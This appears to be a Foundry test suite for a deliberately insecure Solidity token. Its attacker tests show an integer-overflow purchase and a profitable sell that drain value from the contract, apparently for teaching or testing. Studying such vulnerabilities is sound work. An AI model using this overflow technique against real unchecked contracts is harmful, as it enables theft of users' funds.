// SPDX-License-Identifier: UNLICENSE
pragma solidity ^0.7.4;

import "forge-std/Test.sol";

import "./Attacker.sol";
import "./ExampleUser.sol";

contract InsecureTokenTest is Test {
    InsecureToken internal insecureToken;
    Attacker internal attacker;
    ExampleUser internal exampleUser;
    uint256 constant INIT_USER_BALANCE = 100 ether;
    uint256 TOKEN_PRICE = 1 ether;

    function setUp() public {
        insecureToken = new InsecureToken();
        exampleUser = new ExampleUser(address(insecureToken));
        attacker = new Attacker(address(insecureToken));
        vm.deal(address(exampleUser), INIT_USER_BALANCE);
        vm.deal(address(attacker), INIT_USER_BALANCE);
        assertEq(address(exampleUser).balance, INIT_USER_BALANCE);
        assertEq(address(attacker).balance, INIT_USER_BALANCE);
    }

    function testUserBuy() public {
        vm.startPrank(address(exampleUser));
        validation(address(exampleUser));
        uint256 buyAmount = 1 ether;
        insecureToken.buy{value: buyAmount}(buyAmount / 1 ether);
        validation(address(exampleUser));
        vm.stopPrank();
    }

    function testUserSell() public {
        vm.startPrank(address(exampleUser));
        validation(address(exampleUser));
        // buy
        uint256 buyAmount = 10 ether;
        insecureToken.buy{value: buyAmount}(buyAmount / 1 ether);
        validation(address(exampleUser));
        // sell
        insecureToken.sell(1);
        validation(address(exampleUser));
        vm.stopPrank();
    }

    function testAttackerBuy() public {
        vm.startPrank(address(attacker));
        validation(address(attacker));

        uint256 MAX_UINT256 = type(uint256).max;
        uint256 buyAmount = MAX_UINT256 / TOKEN_PRICE + 1;
        uint256 etherNeeded = buyAmount * TOKEN_PRICE;
        insecureToken.buy{value: etherNeeded}(buyAmount);

        attackerValidation(address(attacker));
        vm.stopPrank();
    }

    function testAttackerSell() public {
        vm.startPrank(address(attacker));
        validation(address(attacker));

        // buy
        uint256 buyAmount = 10 ether;
        insecureToken.buy{value: buyAmount}(buyAmount / 1 ether);
        validation(address(exampleUser));

        // sell
        insecureToken.sell(1);

        attackerValidation(address(attacker));
        vm.stopPrank();
    }

    function validation(address user) public {
        assertEq(insecureToken.balanceOf(user) * TOKEN_PRICE + user.balance, INIT_USER_BALANCE);
    }

    function attackerValidation(address _attacker) public {
        assertGt(insecureToken.balanceOf(_attacker) + _attacker.balance, INIT_USER_BALANCE);
    }
}
